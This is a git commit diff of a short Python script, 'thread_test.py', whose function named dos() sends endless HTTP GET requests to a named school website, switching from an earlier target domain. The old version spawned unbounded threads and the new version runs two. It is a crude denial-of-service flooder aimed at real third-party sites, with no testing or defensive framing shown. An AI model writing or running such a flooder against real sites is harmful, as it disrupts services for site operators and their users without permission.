2483a017766e2a2caae86ce668636cb3cb1fc358
rutraq <a3332133@gmail.com>
2018-12-20 11:27:38 +0300

    requests

--- thread_test.py
+++ thread_test.py
@@ -1,14 +1,17 @@
 # coding: utf8
-import threading
+from threading import Thread
 import requests
 import time
 
 
 def dos():
     while True:
-        requests.get("http://www.mtp.by")
+        requests.get("http://www.school110.com")
+        time.sleep(0.2)
 
 
-while True:
-    threading.Thread(target=dos).start()
-    time.sleep(0.2)
+if __name__ == '__main__':
+    thread = Thread(target=dos)
+    thread2 = Thread(target=dos)
+    thread.start()
+    thread2.start()
